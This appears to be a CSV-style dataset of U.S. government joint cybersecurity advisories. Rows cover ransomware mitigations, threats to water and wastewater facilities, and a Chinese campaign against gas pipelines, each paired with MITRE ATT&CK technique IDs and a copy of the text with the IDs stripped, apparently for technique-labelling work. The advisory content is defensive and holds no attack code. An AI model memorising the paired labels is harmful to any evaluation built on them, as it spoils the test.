Minimize the AD attack surface to reduce malicious ticket-granting activity. Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ Ticket Granting service and can be used to obtain hashed credentials that attackers attempt to crack.

Set a strong password policy for service accounts.
Audit Domain Controllers to log successful Kerberos Ticket-Granting Service requests and ensure the events are monitored for anomalous activity.  



Refer to the CISA-Multi-State information and Sharing Center (MS-ISAC) Joint Ransomware Guide for general mitigations to prepare for and reduce the risk of compromise by ransomware attacks. 
Note: critical infrastructure organizations with industrial control systems/operational technology networks should review joint CISA-FBI Cybersecurity Advisory AA21-131A: DarkSide Ransomware: Best Practices for Preventing Business Disruption from Ransomware Attacks for more mitigations, including mitigations to reduce the risk of severe business or functional degradation should their entity fall victim to a ransomware attack. 
Responding to Ransomware Attacks
If a ransomware incident occurs at your organization, CISA, the FBI, and NSA recommend:

Following the Ransomware Response Checklist on p. 11 of the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
Scanning backups. If possible, scan backup data with an antivirus program to check that it is free of malware.
Reporting incidents immediately to the FBI at a local FBI Field Office, CISA at us-cert.cisa.gov/report, or the U.S. Secret Service at a U.S. Secret Service Field Office. 
Applying incident response best practices found in the joint Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

Note: CISA, the FBI, and NSA strongly discourage paying a ransom to criminal actors. Paying a ransom may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or may fund illicit activities. Paying the ransom also does not guarantee that a victim’s files will be recovered.
Resources

For more information and resources on protecting against and responding to ransomware, refer to StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware resources and alerts.
CISA’s Ransomware Readiness Assessment (RRA) is a no-cost self-assessment based on a tiered set of practices to help organizations better assess how well they are equipped to defend and recover from a ransomware incident. 
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.


Contact Information

Victims of ransomware should report it immediately to CISA at us-cert.cisa.gov/report, a local FBI Field Office, or U.S. Secret Service Field Office. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. For NSA client requirements or general cybersecurity inquiries, contact the NSA Cybersecurity Requirements Center at 410-854-4200 or Cybersecurity_Requests@nsa.gov.
This document was developed by CISA, the FBI, and NSA in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations.
Note: the information you have accessed is being provided “as is” for informational purposes only. CISA, the FBI, and NSA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by CISA, the FBI, or NSA.

Revisions

October 18, 2021: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-291a
60,"




Summary

Immediate Actions WWS Facilities Can Take Now to Protect Against Malicious Cyber Activity
• Do not click on suspicious links.
• If you use RDP, secure and monitor it.
• Use strong passwords.
• Use multi-factor authentication.
Note: This advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, version 9. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
This joint advisory is the result of analytic efforts between the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Agency (CISA), the Environmental Protection Agency (EPA), and the National Security Agency (NSA) to highlight ongoing malicious cyber activity—by both known and unknown actors—targeting the information technology (IT) and operational technology (OT) networks, systems, and devices of U.S. Water and Wastewater Systems (WWS) Sector facilities. This activity—which includes attempts to compromise system integrity via unauthorized access—threatens the ability of WWS facilities to provide clean, potable water to, and effectively manage the wastewater of, their communities. Note: although cyber threats across critical infrastructure sectors are increasing, this advisory does not intend to indicate greater targeting of the WWS Sector versus others.
To secure WWS facilities—including Department of Defense (DoD) water treatment facilities in the United States and abroad—against the TTPs listed below, CISA, FBI, EPA, and NSA strongly urge organizations to implement the measures described in the Recommended Mitigations section of this advisory.
Click here for a PDF version of this report.

Technical Details

Threat Overview
Tactics, Techniques, and Procedures
WWS facilities may be vulnerable to the following common tactics, techniques, and procedures (TTPs) used by threat actors to compromise IT and OT networks, systems, and devices.

Spearphishing personnel to deliver malicious payloads, including ransomware [T1566].

 Spearphishing is one of the most prevalent techniques used for initial access to IT networks. Personnel and their potential lack of cyber awareness are a vulnerability within an organization. Personnel may open malicious attachments or links to execute malicious payloads contained in emails from threat actors that have successfully bypassed email filtering controls.
When organizations integrate IT with OT systems, attackers can gain access—either purposefully or inadvertently—to OT assets after the IT network has been compromised through spearphishing and other techniques.
Exploitation of internet-connected services and applications that enable remote access to WWS networks [T1210].

For example, threat actors can exploit a Remote Desktop Protocol (RDP) that is insecurely connected to the internet to infect a network with ransomware. If the RDP is used for process control equipment, the attacker could also compromise WWS operations. Note: the increased use of remote operations due to the COVID-19 pandemic has likely increased the prevalence of weaknesses associated with remote access.




Exploitation of unsupported or outdated operating systems and software.

Threat actors likely seek to take advantage of perceived weaknesses among organizations that either do not have—or choose not to prioritize—resources for IT/OT infrastructure modernization. WWS facilities tend to allocate resources to physical infrastructure in need of replacement or repair (e.g., pipes) rather than IT/OT infrastructure.
The fact that WWS facilities are inconsistently resourced municipal systems—not all of which have the resources to employ consistently high cybersecurity standards—may contribute to the use of unsupported or outdated operating systems and software.


Exploitation of control system devices with vulnerable firmware versions.

WWS systems commonly use outdated control system devices or firmware versions, which expose WWS networks to publicly accessible and remotely executable vulnerabilities. Successful compromise of these devices may lead to loss of system control, denial of service, or loss of sensitive data [T0827].



WWS Sector Cyber Intrusions
Cyber intrusions targeting U.S. WWS facilities highlight vulnerabilities associated with the following threats:

Insider threats, from current or former employees who maintain improperly active credentials
Ransomware attacks

WWS Sector cyber intrusions from 2019 to early 2021 include:

In August 2021, malicious cyber actors used Ghost variant ransomware against a California-based WWS facility. The ransomware variant had been in the system for about a month and was discovered when three supervisory control and data acquisition (SCADA) servers displayed a ransomware message.
In July 2021, cyber actors used remote access to introduce ZuCaNo ransomware onto a Maine-based WWS facility’s wastewater SCADA computer. The treatment system was run manually until the SCADA computer was restored using local control and more frequent operator rounds.
In March 2021, cyber actors used an unknown ransomware variant against a Nevada-based WWS facility. The ransomware affected the victim’s SCADA system and backup systems. The SCADA system provides visibility and monitoring but is not a full industrial control system (ICS).
In September 2020, personnel at a New Jersey-based WWS facility discovered potential Makop ransomware had compromised files within their system.
In March 2019, a former employee at Kansas-based WWS facility unsuccessfully attempted to threaten drinking water safety by using his user credentials, which had not been revoked at the time of his resignation, to remotely access a facility computer.


Mitigations

The FBI, CISA, EPA, and NSA recommend WWS facilities—including DoD water treatment facilities in the United States and abroad—use a risk-informed analysis to determine the applicability of a range of technical and non-technical mitigations to prevent, detect, and respond to cyber threats.
WWS Monitoring
Personnel responsible for monitoring WWS should check for the following suspicious activities and indicators, which may be indicative of threat actor activity:

Inability of WWS facility personnel to access SCADA system controls at any time, either entirely or in part;
Unfamiliar data windows or system alerts appearing on SCADA system controls and facility data screens that could indicate a ransomware attack;
Detection by SCADA system controls, or by water treatment personnel, of abnormal operating parameters—such as unusually high chemical addition rates—used in the safe and proper treatment of drinking water;
Access of SCADA systems by unauthorized individuals or groups, e.g., former employees and current employees not authorized/assigned to operate SCADA systems and controls.
Access of SCADA systems at unusual times, which may indicate that a legitimate user’s credentials have been compromised
Unexplained SCADA system restarts.
Unchanging parameter values that normally fluctuate.

Remote Access Mitigations
Note: The increased use of remote operations due to the COVID-19 pandemic increases the necessity for asset owner-operators to assess the risk associated with enhanced remote access to ensure it falls within acceptable levels. 

Require multi-factor authentication for all remote access to the OT network, including from the IT network and external networks.
Utilize blocklisting and allowlisting to limit remote access to users with a verified business and/or operational need.
Ensure that all remote access technologies have logging enabled and regularly audit these logs to identify instances of unauthorized access.
Utilize manual start and stop features in place of always activated unattended access to reduce the time remote access services are running.
Audit networks for systems using remote access services.

Close unneeded network ports associated with remote access services (e.g., RDP – Transmission Control Protocol [TCP] Port 3389).


When configuring access control for a host, utilize custom settings to limit the access a remote party can attempt to acquire.

Network Mitigations

Implement and ensure robust network segmentation between IT and OT networks to limit the ability of malicious cyber actors to pivot to the OT network after compromising the IT network.

Implement demilitarized zones (DMZs), firewalls, jump servers, and one-way communication diodes to prevent unregulated communication between the IT and OT networks.


Develop/update network maps to ensure a full accounting of all equipment that is connected to the network.

Remove any equipment from networks that is not required to conduct operations to reduce the attack surface malicious actors can exploit.  



Planning and Operational Mitigations

Ensure the organization’s emergency response plan considers the full range of potential impacts that cyberattacks pose to operations, including loss or manipulation of view, loss or manipulation of control, and threats to safety.

The plan should also consider third parties with legitimate need for OT network access, including engineers and vendors.
Review, test, and update the emergency response plan on an annual basis to ensure accuracy.


Exercise the ability to fail over to alternate control systems, including manual operation while assuming degraded electronic communications.
Allow employees to gain decision-making experience via tabletop exercises that incorporate loss of visibility and control scenarios. Utilize resources such as the Environment Protection Agency’s (EPA) Cybersecurity Incident Action Checklist as well as the Ransomware Response Checklist on p. 11 of the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.

Safety System Mitigations

Install independent cyber-physical safety systems. These are systems that physically prevent dangerous conditions from occurring if the control system is compromised by a threat actor.

Examples of cyber-physical safety system controls include:

Size of the chemical feed pump
Gearing on valves
Pressure switches, etc.


These types of controls benefit WWS Sector facilities—especially smaller facilities with limited cybersecurity capability—because they enable facility staff to assess systems from a worst-case scenario and determine protective solutions. Enabling cyber-physical safety systems allows operators to take physical steps to limit the damage, for example, by preventing cyber actors, who have gained control of a sodium hydroxide pump, from raising the pH to dangerous levels.



Additional Mitigations

Foster an organizational culture of cyber readiness. See the CISA Cyber Essentials along with the items listed in the Resources section below for guidance.  
Update software, including operating systems, applications, and firmware on IT network assets. Use a risk-based assessment strategy to determine which OT network assets and zones should participate in the patch management program. Consider using a centralized patch management system.
Set antivirus/antimalware programs to conduct regular scans of IT network assets using up-to-date signatures. Use a risk-based asset inventory strategy to determine how OT network assets are identified and evaluated for the presence of malware.  
Implement regular data backup procedures on both the IT and OT networks.

Regularly test backups.
Ensure backups are not connected to the network to prevent the potential spread of ransomware to the backups.


When possible, enable OT device authentication, utilize the encrypted version of OT protocols, and encrypt all wireless communications to ensure the confidentiality and authenticity of process control data in transit.
Employ user account management to:

Remove, disable, or rename any default system accounts wherever possible.
Implement account lockout policies to reduce risk from brute-force attacks.
Monitor the creation of administrator-level accounts by third-party vendors with robust and privileged account management policies and procedures.
Implement a user account policy that includes set durations for deactivation and removal of accounts after employees leave the organization or after accounts reach a defined period of inactivity.


Implement data execution prevention controls, such as application allowlisting and software restriction policies that prevent programs from executing from common ransomware locations, such as temporary folders supporting popular internet browsers.
Train users through awareness and simulations to recognize and report phishing and social engineering attempts. Identify and suspend access of users exhibiting unusual activity.

FBI, CISA, EPA, and NSA would like to thank Dragos as well as the WaterISAC for their contributions to this advisory.
Resources
Cyber Hygiene Services
CISA offers a range of no-cost cyber hygiene services—including vulnerability scanning and ransomware readiness assessments—to help critical infrastructure organizations assess, identify, and reduce their exposure to cyber threats. By taking advantage of these services, organizations of any size will receive recommendations on ways to reduce their risk and mitigate attack vectors. 
Rewards for Justice Reporting
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.
StopRansomware.gov 
The StopRansomware.gov webpage is an interagency resource that provides guidance on ransomware protection, detection, and response. This includes ransomware alerts, reports, and resources from CISA and other federal partners, including:

CISA and MS-ISAC: Joint Ransomware Guide
CISA Insights: Ransomware Outbreak
CISA Webinar: Combating Ransomware

Additional Resources
For additional resources that can assist in preventing and mitigating this activity, see:

FBI-CISA-EPA-MS-ISAC Joint CSA: Compromise of U.S. Water Treatment Facility
WaterISAC: 15 Cybersecurity Fundamentals for Water and Wastewater Utilities
American Water Works Association: Cybersecurity Guidance and Assessment Tool
EPA: Cybersecurity Incident Action Checklist
EPA: Cybersecurity Best Practices for the Water Sector
EPA: Supporting Cybersecurity Measures with the Clean Water and Drinking Water State Revolving Funds
CISA: Cyber Risks & Resources for the Water and Wastewater Systems Sector infographic
CISA: Critical ICS Cybersecurity Performance Goals and Objectives
CISA Fact Sheet: Rising Ransomware Threat to Operational Technology Assets
CISA-MS-ISAC: Joint Ransomware Guide
NSA CSA: Stop Malicious Cyber Activity Against Connected OT
CISA: Insider Threat Mitigation Resources
NIST: Special Publication (SP) 800-167, Guide to Application Whitelisting
NIST: SP 800-82 Rev. 2, Guide to Industrial Control Systems (ICS) Security (Section 6.2.1)

Disclaimer of Endorsement 
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
 

Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field-offices, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. If you have any further questions related to this Joint Cybersecurity Advisory, or to request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov.

Revisions

Initial Version: October 14, 2021|October 25, 2021: Corrected typo in Additional Resources






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1566', 'T1210', 'T0827'}","




Summary

Immediate Actions WWS Facilities Can Take Now to Protect Against Malicious Cyber Activity
• Do not click on suspicious links.
• If you use RDP, secure and monitor it.
• Use strong passwords.
• Use multi-factor authentication.
Note: This advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, version 9. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
This joint advisory is the result of analytic efforts between the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Agency (CISA), the Environmental Protection Agency (EPA), and the National Security Agency (NSA) to highlight ongoing malicious cyber activity—by both known and unknown actors—targeting the information technology (IT) and operational technology (OT) networks, systems, and devices of U.S. Water and Wastewater Systems (WWS) Sector facilities. This activity—which includes attempts to compromise system integrity via unauthorized access—threatens the ability of WWS facilities to provide clean, potable water to, and effectively manage the wastewater of, their communities. Note: although cyber threats across critical infrastructure sectors are increasing, this advisory does not intend to indicate greater targeting of the WWS Sector versus others.
To secure WWS facilities—including Department of Defense (DoD) water treatment facilities in the United States and abroad—against the TTPs listed below, CISA, FBI, EPA, and NSA strongly urge organizations to implement the measures described in the Recommended Mitigations section of this advisory.
Click here for a PDF version of this report.

Technical Details

Threat Overview
Tactics, Techniques, and Procedures
WWS facilities may be vulnerable to the following common tactics, techniques, and procedures (TTPs) used by threat actors to compromise IT and OT networks, systems, and devices.

Spearphishing personnel to deliver malicious payloads, including ransomware,.

 Spearphishing is one of the most prevalent techniques used for initial access to IT networks. Personnel and their potential lack of cyber awareness are a vulnerability within an organization. Personnel may open malicious attachments or links to execute malicious payloads contained in emails from threat actors that have successfully bypassed email filtering controls.
When organizations integrate IT with OT systems, attackers can gain access—either purposefully or inadvertently—to OT assets after the IT network has been compromised through spearphishing and other techniques.
Exploitation of internet-connected services and applications that enable remote access to WWS networks,.

For example, threat actors can exploit a Remote Desktop Protocol (RDP) that is insecurely connected to the internet to infect a network with ransomware. If the RDP is used for process control equipment, the attacker could also compromise WWS operations. Note: the increased use of remote operations due to the COVID-19 pandemic has likely increased the prevalence of weaknesses associated with remote access.




Exploitation of unsupported or outdated operating systems and software.

Threat actors likely seek to take advantage of perceived weaknesses among organizations that either do not have—or choose not to prioritize—resources for IT/OT infrastructure modernization. WWS facilities tend to allocate resources to physical infrastructure in need of replacement or repair (e.g., pipes) rather than IT/OT infrastructure.
The fact that WWS facilities are inconsistently resourced municipal systems—not all of which have the resources to employ consistently high cybersecurity standards—may contribute to the use of unsupported or outdated operating systems and software.


Exploitation of control system devices with vulnerable firmware versions.

WWS systems commonly use outdated control system devices or firmware versions, which expose WWS networks to publicly accessible and remotely executable vulnerabilities. Successful compromise of these devices may lead to loss of system control, denial of service, or loss of sensitive data,.



WWS Sector Cyber Intrusions
Cyber intrusions targeting U.S. WWS facilities highlight vulnerabilities associated with the following threats:

Insider threats, from current or former employees who maintain improperly active credentials
Ransomware attacks

WWS Sector cyber intrusions from 2019 to early 2021 include:

In August 2021, malicious cyber actors used Ghost variant ransomware against a California-based WWS facility. The ransomware variant had been in the system for about a month and was discovered when three supervisory control and data acquisition (SCADA) servers displayed a ransomware message.
In July 2021, cyber actors used remote access to introduce ZuCaNo ransomware onto a Maine-based WWS facility’s wastewater SCADA computer. The treatment system was run manually until the SCADA computer was restored using local control and more frequent operator rounds.
In March 2021, cyber actors used an unknown ransomware variant against a Nevada-based WWS facility. The ransomware affected the victim’s SCADA system and backup systems. The SCADA system provides visibility and monitoring but is not a full industrial control system (ICS).
In September 2020, personnel at a New Jersey-based WWS facility discovered potential Makop ransomware had compromised files within their system.
In March 2019, a former employee at Kansas-based WWS facility unsuccessfully attempted to threaten drinking water safety by using his user credentials, which had not been revoked at the time of his resignation, to remotely access a facility computer.


Mitigations

The FBI, CISA, EPA, and NSA recommend WWS facilities—including DoD water treatment facilities in the United States and abroad—use a risk-informed analysis to determine the applicability of a range of technical and non-technical mitigations to prevent, detect, and respond to cyber threats.
WWS Monitoring
Personnel responsible for monitoring WWS should check for the following suspicious activities and indicators, which may be indicative of threat actor activity:

Inability of WWS facility personnel to access SCADA system controls at any time, either entirely or in part;
Unfamiliar data windows or system alerts appearing on SCADA system controls and facility data screens that could indicate a ransomware attack;
Detection by SCADA system controls, or by water treatment personnel, of abnormal operating parameters—such as unusually high chemical addition rates—used in the safe and proper treatment of drinking water;
Access of SCADA systems by unauthorized individuals or groups, e.g., former employees and current employees not authorized/assigned to operate SCADA systems and controls.
Access of SCADA systems at unusual times, which may indicate that a legitimate user’s credentials have been compromised
Unexplained SCADA system restarts.
Unchanging parameter values that normally fluctuate.

Remote Access Mitigations
Note: The increased use of remote operations due to the COVID-19 pandemic increases the necessity for asset owner-operators to assess the risk associated with enhanced remote access to ensure it falls within acceptable levels. 

Require multi-factor authentication for all remote access to the OT network, including from the IT network and external networks.
Utilize blocklisting and allowlisting to limit remote access to users with a verified business and/or operational need.
Ensure that all remote access technologies have logging enabled and regularly audit these logs to identify instances of unauthorized access.
Utilize manual start and stop features in place of always activated unattended access to reduce the time remote access services are running.
Audit networks for systems using remote access services.

Close unneeded network ports associated with remote access services (e.g., RDP – Transmission Control Protocol,TCP, Port 3389).


When configuring access control for a host, utilize custom settings to limit the access a remote party can attempt to acquire.

Network Mitigations

Implement and ensure robust network segmentation between IT and OT networks to limit the ability of malicious cyber actors to pivot to the OT network after compromising the IT network.

Implement demilitarized zones (DMZs), firewalls, jump servers, and one-way communication diodes to prevent unregulated communication between the IT and OT networks.


Develop/update network maps to ensure a full accounting of all equipment that is connected to the network.

Remove any equipment from networks that is not required to conduct operations to reduce the attack surface malicious actors can exploit.  



Planning and Operational Mitigations

Ensure the organization’s emergency response plan considers the full range of potential impacts that cyberattacks pose to operations, including loss or manipulation of view, loss or manipulation of control, and threats to safety.

The plan should also consider third parties with legitimate need for OT network access, including engineers and vendors.
Review, test, and update the emergency response plan on an annual basis to ensure accuracy.


Exercise the ability to fail over to alternate control systems, including manual operation while assuming degraded electronic communications.
Allow employees to gain decision-making experience via tabletop exercises that incorporate loss of visibility and control scenarios. Utilize resources such as the Environment Protection Agency’s (EPA) Cybersecurity Incident Action Checklist as well as the Ransomware Response Checklist on p. 11 of the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.

Safety System Mitigations

Install independent cyber-physical safety systems. These are systems that physically prevent dangerous conditions from occurring if the control system is compromised by a threat actor.

Examples of cyber-physical safety system controls include:

Size of the chemical feed pump
Gearing on valves
Pressure switches, etc.


These types of controls benefit WWS Sector facilities—especially smaller facilities with limited cybersecurity capability—because they enable facility staff to assess systems from a worst-case scenario and determine protective solutions. Enabling cyber-physical safety systems allows operators to take physical steps to limit the damage, for example, by preventing cyber actors, who have gained control of a sodium hydroxide pump, from raising the pH to dangerous levels.



Additional Mitigations

Foster an organizational culture of cyber readiness. See the CISA Cyber Essentials along with the items listed in the Resources section below for guidance.  
Update software, including operating systems, applications, and firmware on IT network assets. Use a risk-based assessment strategy to determine which OT network assets and zones should participate in the patch management program. Consider using a centralized patch management system.
Set antivirus/antimalware programs to conduct regular scans of IT network assets using up-to-date signatures. Use a risk-based asset inventory strategy to determine how OT network assets are identified and evaluated for the presence of malware.  
Implement regular data backup procedures on both the IT and OT networks.

Regularly test backups.
Ensure backups are not connected to the network to prevent the potential spread of ransomware to the backups.


When possible, enable OT device authentication, utilize the encrypted version of OT protocols, and encrypt all wireless communications to ensure the confidentiality and authenticity of process control data in transit.
Employ user account management to:

Remove, disable, or rename any default system accounts wherever possible.
Implement account lockout policies to reduce risk from brute-force attacks.
Monitor the creation of administrator-level accounts by third-party vendors with robust and privileged account management policies and procedures.
Implement a user account policy that includes set durations for deactivation and removal of accounts after employees leave the organization or after accounts reach a defined period of inactivity.


Implement data execution prevention controls, such as application allowlisting and software restriction policies that prevent programs from executing from common ransomware locations, such as temporary folders supporting popular internet browsers.
Train users through awareness and simulations to recognize and report phishing and social engineering attempts. Identify and suspend access of users exhibiting unusual activity.

FBI, CISA, EPA, and NSA would like to thank Dragos as well as the WaterISAC for their contributions to this advisory.
Resources
Cyber Hygiene Services
CISA offers a range of no-cost cyber hygiene services—including vulnerability scanning and ransomware readiness assessments—to help critical infrastructure organizations assess, identify, and reduce their exposure to cyber threats. By taking advantage of these services, organizations of any size will receive recommendations on ways to reduce their risk and mitigate attack vectors. 
Rewards for Justice Reporting
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.
StopRansomware.gov 
The StopRansomware.gov webpage is an interagency resource that provides guidance on ransomware protection, detection, and response. This includes ransomware alerts, reports, and resources from CISA and other federal partners, including:

CISA and MS-ISAC: Joint Ransomware Guide
CISA Insights: Ransomware Outbreak
CISA Webinar: Combating Ransomware

Additional Resources
For additional resources that can assist in preventing and mitigating this activity, see:

FBI-CISA-EPA-MS-ISAC Joint CSA: Compromise of U.S. Water Treatment Facility
WaterISAC: 15 Cybersecurity Fundamentals for Water and Wastewater Utilities
American Water Works Association: Cybersecurity Guidance and Assessment Tool
EPA: Cybersecurity Incident Action Checklist
EPA: Cybersecurity Best Practices for the Water Sector
EPA: Supporting Cybersecurity Measures with the Clean Water and Drinking Water State Revolving Funds
CISA: Cyber Risks & Resources for the Water and Wastewater Systems Sector infographic
CISA: Critical ICS Cybersecurity Performance Goals and Objectives
CISA Fact Sheet: Rising Ransomware Threat to Operational Technology Assets
CISA-MS-ISAC: Joint Ransomware Guide
NSA CSA: Stop Malicious Cyber Activity Against Connected OT
CISA: Insider Threat Mitigation Resources
NIST: Special Publication (SP) 800-167, Guide to Application Whitelisting
NIST: SP 800-82 Rev. 2, Guide to Industrial Control Systems (ICS) Security (Section 6.2.1)

Disclaimer of Endorsement 
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
 

Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field-offices, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. If you have any further questions related to this Joint Cybersecurity Advisory, or to request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov.

Revisions

Initial Version: October 14, 2021|October 25, 2021: Corrected typo in Additional Resources






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-287a
61,"




Summary

This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Version 9. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
Note: CISA released technical information, including indicators of compromise (IOCs), provided in this advisory in 2012 to affected organizations and stakeholders.
This Joint Cybersecurity Advisory—coauthored by the Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI)—provides information on a spearphishing and intrusion campaign conducted by state-sponsored Chinese actors that occurred from December 2011 to 2013, targeting U.S. oil and natural gas (ONG) pipeline companies.
CISA and the FBI provided incident response and remediation support to a number of victims of this activity. Overall, the U.S. Government identified and tracked 23 U.S. natural gas pipeline operators targeted from 2011 to 2013 in this spearphishing and intrusion campaign. Of the known targeted entities, 13 were confirmed compromises, 3 were near misses, and 7 had an unknown depth of intrusion.
The U.S. Government has attributed this activity to Chinese state-sponsored actors. CISA and the FBI assess that these actors were specifically targeting U.S. pipeline infrastructure for the purpose of holding U.S. pipeline infrastructure at risk. Additionally, CISA and the FBI assess that this activity was ultimately intended to help China develop cyberattack capabilities against U.S. pipelines to physically damage pipelines or disrupt pipeline operations.
This advisory provides information on this campaign, including tactics, techniques, and procedures (TTPs) and IOCs. The TTPs remain relevant to help network defenders protect against intrusions. The IOCs are provided for historical awareness.
CISA and the FBI urge owners and operators of Energy Sector and other critical infrastructure (CI) networks to adopt a heightened state of awareness and implement the recommendations listed in the Mitigations section of this advisory, which include implementing network segmentation between IT and industrial control system (ICS)/operational technology (OT) networks. These mitigations will improve a CI entity’s defensive cyber posture and functional resilience by reducing the risk of compromise or severe operational degradation if the system is compromised by malicious cyber actors, including but not limited to actors associated with the campaign described in this advisory.
For more information on Chinese malicious cyber activity, see us-cert.cisa.gov/china.
Click here for a PDF version of this report.

Technical Details

In April 2012, CISA received reports about targeted attacks directed at multiple ONG pipeline sites; CISA (via a predecessor organization) and FBI provided incident response and remediation support to a number of victims from 2012 to 2013. CISA and FBI’s analysis of the malware and threat actor techniques identified that this activity was related to a spearphishing campaign. The U.S. Government identified and tracked 23 U.S. natural gas pipeline operators targeted in this campaign. Of the 23 known targeted entities, 13 were confirmed compromises, 3 were near misses, and 7 had an unknown depth of intrusion.
Threat Actor Activity
The spearphishing activity appears to have started in late December 2011. From December 9, 2011, through at least February 29, 2012, ONG organizations received spearphishing emails [T1566.002] specifically targeting their employees. The emails were at constructed with a high level of sophistication to convince employees to view malicious files [T1204.002]. Note: see the appendix for a table of the MITRE ATT&CK tactics and techniques observed in this campaign.
In addition to spearphishing, CISA and the FBI were made aware of social engineering attempts by malicious actors believed to be associated with this campaign. The apparent goal was to gain sensitive information from asset owners [T1598]. One asset owner reported that individuals in their network engineering department, including managers, received multiple phone calls requesting information about their recent network security practices. Other employees in other departments were not targeted. The asset owner also reported that these calls began immediately after they had identified and removed the malicious intruder from their network and performed a system-wide credential reset. The caller identified himself as an employee of a large computer security firm performing a national survey about network cybersecurity practices. He inquired about the organization’s policy and practices for firewall use and settings, types of software used to protect their network, and the use and type of intrusion detection and/or prevention systems. The caller was blocking his caller ID and when the targeted organization tried to return the call, they reached a number that was not in service.
During the investigation of these compromises, CISA and FBI personnel discovered that Chinese state-sponsored actors specifically collected [TA0009] and exfiltrated [TA0010] ICS-related information. The Chinese state-sponsored actors searched document repositories [T1213] for the following data types:

Document searches: “SCAD*”
Personnel lists
Usernames/passwords
Dial-up access information
System manuals

Based on incident data, CISA and FBI assessed that Chinese state-sponsored actors also compromised various authorized remote access channels, including systems designed to transfer data and/or allow access between corporate and ICS networks. Though designed for legitimate business purposes, these systems have the potential to be manipulated by malicious cyber actors if unmitigated. With this access, the Chinese state-sponsored actors could have impersonated legitimate system operators to conduct unauthorized operations. According to the evidence obtained by CISA and FBI, the Chinese state-sponsored actors made no attempts to modify the pipeline operations of systems they accessed. Note: there was a significant number of cases where log data was not available, and the depth of intrusion and persistent impacts were unable to be determined; at least 8 of 23 cases (35 percent) identified in the campaign were assessed as having an unknown depth of intrusion due to the lack of log data.
CISA and FBI assess that during these intrusions, China was successful in accessing the supervisory control and data acquisition (SCADA) networks at several U.S. natural gas pipeline companies.
Chinese actors also gained information specific to dial-up access, including phone numbers, usernames, and passwords [T1120]. Dial-up modems continue to be prevalent in the Energy Sector, providing direct access into the ICS environment with little or no security and no monitoring, which makes them an optimal vector for hold-at-risk operations. The exfiltrated data provided the capabilities for the Chinese cyber actors to access ONG operational systems at a level where they could potentially conduct unauthorized operations.
Exfiltrated Information and Assessed Motives
The Chinese actors specifically targeted information that pertained to access of ICSs. Searches were made for terms involving “SCAD*,” and the actors exfiltrated documents, including personnel lists, usernames and passwords, dial-up access information, remote terminal unit (RTU) sites, and systems manuals. The Chinese actors also exfiltrated information pertaining to ICS permission groups and compromised jump points between corporate and ICS networks. The totality of this information would allow the actors to access ICS networks via multiple channels and would provide sufficient access to allow them to remotely perform unauthorized operations on the pipeline with physical consequences.
